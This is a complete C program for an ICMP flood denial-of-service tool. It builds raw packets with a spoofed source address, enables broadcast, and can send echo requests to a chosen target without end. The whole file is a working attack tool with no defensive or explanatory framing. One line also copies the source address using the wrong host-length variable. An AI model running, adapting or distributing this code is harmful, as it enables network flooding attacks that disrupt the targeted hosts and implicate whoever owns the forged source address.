#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>
 
#define BUFFER_SIZE			400
#define PACKET_DELAY_USEC	30
#define DEF_NUM_PACKETS		100
 
unsigned char buf[BUFFER_SIZE];
 
/*
	Usage: ./icmp_flood <saddr> <daddr> <# packets>
	<saddr> = spoofed source address
	<daddr> = target IP address
	<# packets> = is the number of packets to send, 100 is the default, 0 = infinite
*/
 
void ICMP(struct icmphdr *ICMP_Frame, struct ip *IP_Frame)
{
    // IP Layer
    IP_Frame -> ip_v = 4;
    IP_Frame -> ip_hl = sizeof(struct ip) >> 2;
    IP_Frame -> ip_tos = 0;
    IP_Frame -> ip_len = htons(sizeof(buf));
    IP_Frame -> ip_id = htons(4321);
    IP_Frame -> ip_off = htons(0);
    IP_Frame -> ip_ttl = 255;
    IP_Frame -> ip_p = 1;
    IP_Frame -> ip_sum = 0; /* Let kernel fill in */
 
    // ICMP Layer
    ICMP_Frame -> type = ICMP_ECHO;
    ICMP_Frame -> code = 0;	
    ICMP_Frame -> checksum = htons(~(ICMP_ECHO << 8));	
}
 
void set_socket_options(int sock_fd)
{
    int on = 1;
 
    // Enable broadcast
    if (setsockopt(sock_fd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0)
	{
        perror("setsockopt() for BROADCAST error");
        exit(1);
    }
 
    // socket options, tell the kernel we provide the IP structure 
    if (setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
	{
        perror("setsockopt() for IP_HDRINCL error");
        exit(1);
    }	
}
 
int main(int argc, char *argv[])
{
    int sock_fd, i;	
    struct ip *ip = (struct ip *)buf;
    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
    struct hostent *hp, *hp2;
    struct sockaddr_in dst;
    int num = DEF_NUM_PACKETS;
 
    if (argc < 3)
	{
        fprintf(stderr, "parameter error\n");
        exit(1);
    }
 
    if (argc == 4)
        num = atoi(argv[3]);
 
	if ((sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		perror("socket() error");
		exit(1);
	}

	set_socket_options(sock_fd);

	//memset(buf, 0, sizeof(buf));

	if ((hp = gethostbyname(argv[2])) == NULL)
	{
		if ((ip -> ip_dst.s_addr = inet_addr(argv[2])) == -1)
		{
			fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);
			exit(1);
		}
	}
	else
		memcpy(&ip -> ip_dst.s_addr, hp -> h_addr_list[0], hp -> h_length);

	if ((hp2 = gethostbyname(argv[1])) == NULL)
	{
		if ((ip -> ip_src.s_addr = inet_addr(argv[1])) == -1)
		{
			fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);
			exit(1);
		}
	}
	else
		memcpy(&ip -> ip_src.s_addr, hp2 -> h_addr_list[0], hp -> h_length);

	ICMP(icmp, ip);

	dst.sin_addr = ip -> ip_dst;
	dst.sin_family = AF_INET;

    for(i = 1; num == 0 ? num == 0 : i <= num; i++)
	{
		if (sendto(sock_fd, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		{
            fprintf(stderr, "Error during packet send.\n");
            perror("sendto() error");
        }
		else
            printf("sendto() is OK.\n");
 
        usleep(PACKET_DELAY_USEC);
    }
    return 0;
}
